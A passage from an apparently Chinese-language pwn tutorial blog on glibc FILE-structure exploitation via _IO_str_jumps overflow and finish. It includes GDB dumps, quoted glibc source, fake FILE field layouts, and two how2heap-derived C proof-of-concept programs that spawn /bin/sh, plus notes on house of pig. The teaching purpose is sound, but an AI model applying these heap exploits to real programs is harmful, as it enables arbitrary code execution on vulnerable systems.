class="number">0x7ffff7dd1910</span> &lt;_IO_2_1_stdin_+<span class="number">48</span>&gt;: <span class="number">0x0000000000602010</span>  <span class="number">0x00007ffff7dd2740</span> &lt;== _IO_buf_base</span><br><span class="line"><span class="number">0x7ffff7dd1920</span> &lt;_IO_2_1_stdin_+<span class="number">64</span>&gt;: <span class="number">0x00007ffff7dd27c0</span>  <span class="number">0x0000000000000000</span> &lt;== _IO_buf_end</span><br><span class="line"><span class="number">0x7ffff7dd1930</span> &lt;_IO_2_1_stdin_+<span class="number">80</span>&gt;: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1940</span> &lt;_IO_2_1_stdin_+<span class="number">96</span>&gt;: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1950</span> &lt;_IO_2_1_stdin_+<span class="number">112</span>&gt;:    <span class="number">0x0000000000000000</span>  <span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="number">0x7ffff7dd1960</span> &lt;_IO_2_1_stdin_+<span class="number">128</span>&gt;:    <span class="number">0x0000000000000000</span>  <span class="number">0x00007ffff7dd3790</span></span><br><span class="line"><span class="number">0x7ffff7dd1970</span> &lt;_IO_2_1_stdin_+<span class="number">144</span>&gt;:    <span class="number">0xffffffffffffffff</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1980</span> &lt;_IO_2_1_stdin_+<span class="number">160</span>&gt;:    <span class="number">0x00007ffff7dd19c0</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1990</span> &lt;_IO_2_1_stdin_+<span class="number">176</span>&gt;:    <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd19a0</span> &lt;_IO_2_1_stdin_+<span class="number">192</span>&gt;:    <span class="number">0x00000000ffffffff</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd19b0</span> &lt;_IO_2_1_stdin_+<span class="number">208</span>&gt;:    <span class="number">0x0000000000000000</span>  <span class="number">0x00007ffff7dd06e0</span></span><br></pre></td></tr></table></figure>

<p>之后 scanf 的读入数据就会写入到 0x7ffff7dd2740 的位置</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffff7dd2740</span> &lt;buf&gt;:   <span class="number">0x00000a6161616161</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2750</span> &lt;<span class="built_in">buffer</span>&gt;:    <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2760</span> &lt;<span class="built_in">buffer</span>&gt;:    <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2770</span> &lt;<span class="built_in">buffer</span>&gt;:    <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2780</span> &lt;<span class="built_in">buffer</span>&gt;:    <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<h4 id="IO-str-jumps-gt-overflow"><a href="#IO-str-jumps-gt-overflow" class="headerlink" title="_IO_str_jumps -&gt; overflow"></a>_IO_str_jumps -&gt; overflow</h4><p><code>libc</code>中不仅仅只有<code>_IO_file_jumps</code>这么一个<code>vtable</code>，还有一个叫<code>_IO_str_jumps</code>的 ，这个 <code>vtable</code> 不在 check 范围之内。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(<span class="built_in">overflow</span>, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(<span class="built_in">read</span>, _IO_default_read),</span><br><span class="line">  JUMP_INIT(<span class="built_in">write</span>, _IO_default_write),</span><br><span class="line">  JUMP_INIT(<span class="built_in">seek</span>, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(<span class="built_in">close</span>, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>如果我们能设置文件指针的 <code>vtable</code> 为 <code>_IO_str_jumps</code> 么就能调用不一样的文件操作函数。这里以<code>_IO_str_overflow</code>为例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_str_overflow (_IO_FILE *fp, <span class="keyword">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> flush_only = c == EOF;</span><br><span class="line">  _IO_size_t pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)<span class="comment">// pass</span></span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))<span class="comment">// should in </span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span> <span class="comment">// pass</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">char</span> *new_buf;</span><br><span class="line">      <span class="keyword">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">      _IO_size_t new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">      <span class="keyword">if</span> (new_size &lt; old_blen)<span class="comment">//pass 一般会通过</span></span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">      new_buf</span><br><span class="line">        = (<span class="keyword">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);<span class="comment">//target [fp+0xe0]</span></span><br><span class="line">      <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">          <span class="keyword">return</span> EOF;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (old_buf)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">          (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);</span><br><span class="line">          <span class="comment">/* Make sure _IO_setb won't try to delete _IO_buf_base. */</span></span><br><span class="line">          fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">'\0'</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">      _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">      fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">      fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="keyword">unsigned</span> <span class="keyword">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure>

<p>利用以下代码来劫持程序流程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new_buf</span><br><span class="line">  = (<span class="keyword">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</span><br></pre></td></tr></table></figure>

<p>几个条件 bypass：</p>
<ol>
<li><code>1. fp-&gt;_flags &amp; _IO_NO_WRITES为假</code></li>
<li><code>2. (pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) &gt;= ((fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + flush_only(1))</code></li>
<li><code>3. fp-&gt;_flags &amp; _IO_USER_BUF(0x01)为假</code></li>
<li><code>4. 2*(fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100 不能为负数</code></li>
<li><code>5. new_size = 2 * (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100; 应当指向/bin/sh字符串对应的地址</code></li>
<li><code>6. fp+0xe0指向system地址</code></li>
</ol>
<p>构造：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">_flags = <span class="number">0</span></span><br><span class="line">_IO_write_base = <span class="number">0</span></span><br><span class="line">_IO_write_ptr = (binsh_in_libc_addr <span class="number">-100</span>) / <span class="number">2</span> +<span class="number">1</span></span><br><span class="line">_IO_buf_end = (binsh_in_libc_addr <span class="number">-100</span>) / <span class="number">2</span> </span><br><span class="line"></span><br><span class="line">_freeres_list = <span class="number">0x2</span></span><br><span class="line">_freeres_buf = <span class="number">0x3</span></span><br><span class="line">_mode = <span class="number">-1</span></span><br><span class="line"></span><br><span class="line">vtable = _IO_str_jumps - <span class="number">0x18</span></span><br></pre></td></tr></table></figure>

<p>示例</p>
<p>修改了 how2heap 的 houseoforange 代码，可以自己动手调试一下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">winner</span> <span class="params">( <span class="keyword">char</span> *ptr)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *p1, *p2;</span><br><span class="line">    <span class="keyword">size_t</span> io_list_all, *top;</span><br><span class="line">    <span class="comment">// unsorted bin attack</span></span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span><span class="number">-16</span>);</span><br><span class="line">    top = (<span class="keyword">size_t</span> *) ( (<span class="keyword">char</span> *) p1 + <span class="number">0x400</span> - <span class="number">16</span>);</span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0xc01</span>;</span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    io_list_all = top[<span class="number">2</span>] + <span class="number">0x9a8</span>;</span><br><span class="line">    top[<span class="number">3</span>] = io_list_all - <span class="number">0x10</span>;</span><br><span class="line">    <span class="comment">// _IO_str_overflow conditions</span></span><br><span class="line">    <span class="keyword">char</span> binsh_in_libc[] = <span class="string">"/bin/sh\x00"</span>; <span class="comment">// we can found "/bin/sh" in libc, here i create it in stack</span></span><br><span class="line">    <span class="comment">// top[0] = ~1;</span></span><br><span class="line">    <span class="comment">// top[0] &amp;= ~8;</span></span><br><span class="line">    top[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    top[<span class="number">4</span>] = <span class="number">0</span>; <span class="comment">// write_base</span></span><br><span class="line">    top[<span class="number">5</span>] = ((<span class="keyword">size_t</span>)&amp;binsh_in_libc<span class="number">-100</span>)/<span class="number">2</span> + <span class="number">1</span>; <span class="comment">// write_ptr</span></span><br><span class="line">    top[<span class="number">7</span>] = <span class="number">0</span>; <span class="comment">// buf_base</span></span><br><span class="line">    top[<span class="number">8</span>] = top[<span class="number">5</span>] - <span class="number">1</span>; <span class="comment">// buf_end</span></span><br><span class="line">    <span class="comment">// house_of_orange conditions</span></span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0x61</span>;</span><br><span class="line"></span><br><span class="line">    top[<span class="number">20</span>] = (<span class="keyword">size_t</span>) &amp;top[<span class="number">18</span>];</span><br><span class="line">    top[<span class="number">21</span>] = <span class="number">2</span>;</span><br><span class="line">    top[<span class="number">22</span>] = <span class="number">3</span>;</span><br><span class="line">    top[<span class="number">24</span>] = <span class="number">-1</span>;</span><br><span class="line">    top[<span class="number">27</span>] = (<span class="keyword">size_t</span>)<span class="built_in">stdin</span> - <span class="number">0x3868</span><span class="number">-0x18</span>; <span class="comment">// _IO_str_jumps地址</span></span><br><span class="line">    top[<span class="number">28</span>] = (<span class="keyword">size_t</span>) &amp;winner;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Finally, trigger the whole chain by calling malloc */</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">winner</span><span class="params">(<span class="keyword">char</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    system(ptr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时 house of pig 中的利用也是比较典型的例子，注意到满足</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="keyword">size_t</span>) (_IO_blen (fp) + flush_only))</span><br></pre></td></tr></table></figure>

<p>的时候，会先后执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">size_t old_blen &#x3D; _IO_blen (fp);</span><br><span class="line">&#x2F;&#x2F; #define _IO_blen (fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span><br><span class="line">new_buf &#x3D; malloc (new_size);</span><br><span class="line">memcpy (new_buf, old_buf, old_blen);</span><br><span class="line">free (old_buf);</span><br></pre></td></tr></table></figure>

<p>三个操作，伪造 _IO_FILE 并劫持 vtable 为 _IO_str_jumps 通过一个 large bin attack 就可以轻松实现，并且我们上面三c个语句中的 new_size，old_buf 和 old_blen 是我们可控的，这个函数就可以实现以下三步</p>
<ol>
<li>调用 malloc，实现从 tcache 中分配 chunk，在这里就可以把我们之前放入的 __free_hook fake chunk 申请出来</li>
<li>将一段可控长度可控内容的内存段拷贝置 malloc 得来的 chunk 中（可以修改 __free_hook 为 system）</li>
<li>调用 free，且参数为内存段起始地址（”/bin/sh\x00”，getshell）</li>
</ol>
<p>也就是只要我们构造得当，执行该函数即可 getshell。</p>
<h4 id="IO-str-jumps-gt-finish"><a href="#IO-str-jumps-gt-finish" class="headerlink" title="_IO_str_jumps -&gt; finish"></a>_IO_str_jumps -&gt; finish</h4><p>原理与上面的 _IO_str_jumps -&gt; overflow 类似</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="keyword">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);  <span class="comment">//[fp+0xe8]</span></span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>条件：</p>
<ol>
<li>_IO_buf_base 不为空</li>
<li>_flags &amp; _IO_USER_BUF(0x01) 为假</li>
</ol>
<p>构造如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">_flags = (binsh_in_libc + <span class="number">0x10</span>) &amp; ~<span class="number">1</span></span><br><span class="line">_IO_buf_base = binsh_addr</span><br><span class="line"></span><br><span class="line">_freeres_list = <span class="number">0x2</span></span><br><span class="line">_freeres_buf = <span class="number">0x3</span></span><br><span class="line">_mode = <span class="number">-1</span></span><br><span class="line">vtable = _IO_str_finish - <span class="number">0x18</span></span><br><span class="line">fp+<span class="number">0xe8</span> -&gt; system_addr</span><br></pre></td></tr></table></figure>

<p>示例</p>
<p>修改了 how2heap 的 houseoforange 代码，可以自己动手调试一下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">winner</span> <span class="params">( <span class="keyword">char</span> *ptr)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *p1, *p2;</span><br><span class="line">    <span class="keyword">size_t</span> io_list_all, *top;</span><br><span class="line">    <span class="comment">// unsorted bin attack</span></span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span><span class="number">-16</span>);</span><br><span class="line">    top = (<span class="keyword">size_t</span> *) ( (<span class="keyword">char</span> *) p1 + <span class="number">0x400</span> - <span class="number">16</span>);</span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0xc01</span>;</span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    io_list_all = top[<span class="number">2</span>] + <span class="number">0x9a8</span>;</span><br><span class="line">    top[<span class="number">3</span>] = io_list_all - <span class="number">0x10</span>;</span><br><span class="line">    <span class="comment">// _IO_str_finish conditions</span></span><br><span class="line">    <span class="keyword">char</span> binsh_in_libc[] = <span class="string">"/bin/sh\x00"</span>; <span class="comment">// we can found "/bin/sh" in libc, here i create it in stack</span></span><br><span class="line"></span><br><span class="line">    top[<span class="number">0</span>] = ((<span class="keyword">size_t</span>) &amp;binsh_in_libc + <span class="number">0x10</span>) &amp; ~<span class="number">1</span>;</span><br><span class="line">    top[<span class="number">7</span>] = ((<span class="keyword">size_t</span>)&amp;binsh_in_libc); <span class="comment">// buf_base</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// house_of_orange conditions</span></span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0x61</span>;</span><br><span class="line">    top[<span class="number">5</span>] = <span class="number">0x1</span> ; <span class="comment">//_IO_write_ptr</span></span><br><span class="line">    top[<span class="number">20</span>] = (<span class="keyword">size_t</span>) &amp;top[<span class="number">18</span>];</span><br><span class="line">    top[<span class="number">21</span>] = <span class="number">2</span>;</span><br><span class="line">    top[<span class="number">22</span>] = <span class="number">3</span>;</span><br><span class="line">    top[<span class="number">24</span>] = <span class="number">-1</span>;</span><br><span class="line">    top[<span class="number">27</span>] = (<span class="keyword">size_t</span>) <span class="built_in">stdin</span> - <span class="number">0x33f0</span> - <span class="number">0x18</span>;</span><br><span class="line">    top[<span class="number">29</span>] = (<span class="keyword">size_t</span>) &amp;winner;</span><br><span class="line">        top[<span class="number">30</span>] = (<span class="keyword">size_t</span>) &amp;top[<span class="number">30</span>];</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">winner</span><span class="params">(<span class="keyword">char</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    system(ptr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Ma9icCR</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://ma9iccr.github.io/2022-03/PWN%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-Heap/">https://ma9iccr.github.io/2022-03/PWN%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-Heap/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://ma9iccr.github.io" target="_blank">Ma9icCR</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022-03/PWN%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-Integer/"><img class="prev-cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">PWN入门到入狱-Integer</div></div></a></div><div class="next-post pull-right"><a href="/2022-03/PWN%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-Format/"><img class="next-cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">PWN入门到入狱-Format</div></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2022-05/pwn题如何配置和靶机一样的环境/" title="pwn题如何配置和靶机一样的环境"><img class="relatedPosts_cover" 